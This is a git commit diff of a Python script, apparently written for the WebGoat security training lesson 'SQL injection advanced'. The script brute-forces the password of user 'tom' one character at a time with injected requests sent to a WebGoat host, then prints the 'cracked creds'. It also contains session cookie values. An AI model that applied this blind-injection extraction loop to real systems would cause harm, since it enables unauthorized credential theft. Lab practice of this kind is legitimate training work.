5e2eda68696392c6f17a9f0a46bf416ee8ed54f2
Robyn12 <ruhanen.joel@gmail.com>
2019-04-14 12:33:30 +0300

    Add files via upload

--- sqlInjectionAdv5.py
+++ sqlInjectionAdv5.py
@@ -2,15 +2,22 @@
 import requests
 import json
 
+JSessionID = "JSESSIONID=550D25F496F7849D220A02DE615EF848"
 charset="abcdefghijklmnopqrstuvwxyz0123456789"
 def main():
+  tmp = ""
   passu = ""
   for i in range(1,30):
+    tmp = passu
     for c in charset:
       passu += doRequest(i,c)
+    if passu == tmp:
+      print "cracked creds are:"
+      print "tom:" + passu
+      break
     print passu
 def doRequest(i,c):
-  headers = { "Host": "miksi.me:8080", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0", "Accept": "*/*", "Referer": "http://miksi.me:8080/WebGoat/start.mvc", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Content-Length": "60", "Connection": "keep-alive", "Cookie": "JSESSIONID=BBEAF5587B5CFBF87717DFCFBCFF0A22" }
+  headers = { "Host": "miksi.me:8080", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0", "Accept": "*/*", "Referer": "http://miksi.me:8080/WebGoat/start.mvc", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Content-Length": "60", "Connection": "keep-alive", "Cookie": JSessionID }
 
   r = None
 
